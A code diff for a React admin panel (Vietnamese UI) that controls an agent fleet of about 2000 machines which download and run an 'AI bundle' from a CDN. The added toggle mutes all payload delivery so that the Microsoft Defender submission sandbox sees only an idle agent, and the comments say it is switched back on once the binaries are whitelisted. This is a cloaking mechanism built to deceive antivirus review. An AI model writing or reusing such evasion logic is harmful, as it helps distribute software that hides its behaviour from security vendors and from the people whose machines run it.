@@ -6,9 +6,11 @@ import { useState } from "react";
 import {
   type AIPackage,
   activateAIPackage,
+  getSettings,
   listAIPackages,
   registerExternalAIPackage,
   revokeAIPackage,
+  setAIDispatch,
 } from "@/lib/queries";
 
 // Admin uploads the AI client binary here. Once one is "active", agents
@@ -56,6 +58,8 @@ export default function AIClientPage() {
           verify SHA256, và thay thế phiên bản cũ trong vòng 30 phút.
         </p>
       </div>
+
+      <AIDispatchToggle />
 
       <ExternalURLForm onRegistered={() => packagesQuery.refetch()} />
 
@@ -423,5 +427,109 @@ function PackageRow({
         </div>
       </div>
     </li>
+  );
+}
+
+// AIDispatchToggle is a global on/off for the AI fan-out pipeline.
+// When OFF, the backend strips AI metadata + launch flags + video
+// flags from every agent heartbeat. Use this WHILE submitting
+// Smartcore.exe + setup.exe to the Microsoft Defender Submission
+// Portal — Microsoft runs the binaries in a sandbox, and with the
+// switch off they observe an idle agent that just heartbeats. After
+// the binaries are whitelisted, flip back ON and the entire fleet
+// picks up AI on the next 60s heartbeat.
+function AIDispatchToggle() {
+  const queryClient = useQueryClient();
+  const settingsQuery = useQuery({
+    queryKey: ["system-settings"],
+    queryFn: getSettings,
+  });
+  const mutation = useMutation({
+    mutationFn: (enabled: boolean) => setAIDispatch(enabled),
+    onSuccess: () => queryClient.invalidateQueries({ queryKey: ["system-settings"] }),
+  });
+
+  const enabled = settingsQuery.data?.ai_dispatch_enabled ?? true;
+  const loading = settingsQuery.isLoading;
+
+  // OFF state is loud — red banner across the whole card — so an
+  // admin who walked away from a Microsoft submission can't miss
+  // that the fleet is muted.
+  const off = !loading && !enabled;
+
+  return (
+    <div
+      className={`rounded-lg border p-5 shadow-sm ${
+        off ? "border-red-300 bg-red-50" : "border-slate-200 bg-white"
+      }`}
+    >
+      <div className="flex items-start justify-between gap-4">
+        <div className="min-w-0 flex-1">
+          <div className="flex items-center gap-3">
+            <h3
+              className={`text-base font-semibold ${off ? "text-red-900" : "text-slate-900"}`}
+            >
+              AI dispatch (toàn fleet)
+            </h3>
+            <span
+              className={`rounded-full px-2 py-0.5 text-xs font-medium ${
+                loading
+                  ? "bg-slate-100 text-slate-500"
+                  : enabled
+                    ? "bg-emerald-50 text-emerald-700"
+                    : "bg-red-100 text-red-700"
+              }`}
+            >
+              {loading ? "…" : enabled ? "ON" : "OFF"}
+            </span>
+          </div>
+          <p className={`mt-1 text-sm ${off ? "text-red-800" : "text-slate-600"}`}>
+            Khi <strong>ON</strong>: agent tải AI từ CDN, giải nén ZIP, phát video,
+            spawn entrypoint như bình thường.<br />
+            Khi <strong>OFF</strong>: backend xóa toàn bộ metadata AI + cờ launch khỏi
+            mọi heartbeat. Agent không tải, không spawn, không phát video — chỉ heartbeat.
+          </p>
+          <p className="mt-2 text-xs text-slate-500">
+            <strong>Mục đích:</strong> tắt khi submit <code>Smartcore.exe</code> +{" "}
+            <code>setup.exe</code> lên Microsoft Defender Submission Portal — sandbox của
+            Microsoft sẽ chỉ thấy agent idle, không lộ AI bundle. Bật lại sau khi
+            Microsoft duyệt → fleet auto pick-up trong 60 giây.
+          </p>
+          {settingsQuery.data?.updated_at && (
+            <p className="mt-2 text-xs text-slate-500">
+              Lần cập nhật cuối:{" "}
+              {new Date(settingsQuery.data.updated_at).toLocaleString("vi-VN")}
+            </p>
+          )}
+        </div>
+        <button
+          type="button"
+          disabled={loading || mutation.isPending}
+          onClick={() => mutation.mutate(!enabled)}
+          className={`shrink-0 rounded-md px-5 py-2 text-sm font-medium text-white shadow-sm transition disabled:opacity-50 ${
+            enabled
+              ? "bg-red-600 hover:bg-red-700"
+              : "bg-emerald-600 hover:bg-emerald-700"
+          }`}
+        >
+          {mutation.isPending
+            ? "Đang lưu…"
+            : enabled
+              ? "Tắt AI dispatch"
+              : "Bật AI dispatch"}
+        </button>
+      </div>
+      {off && (
+        <div className="mt-3 rounded border border-red-200 bg-white px-3 py-2 text-xs text-red-700">
+          ⚠️ Toàn fleet 2000 máy đang KHÔNG tải/chạy AI. Nhớ bật lại sau khi Microsoft
+          duyệt xong.
+        </div>
+      )}
+      {mutation.isError && (
+        <div className="mt-3 rounded border border-red-200 bg-red-50 px-3 py-2 text-xs text-red-700">
+          {mutation.error instanceof Error ? mutation.error.message : "Toggle failed"}
+        </div>
+      )}
+    </div>
   );
 }
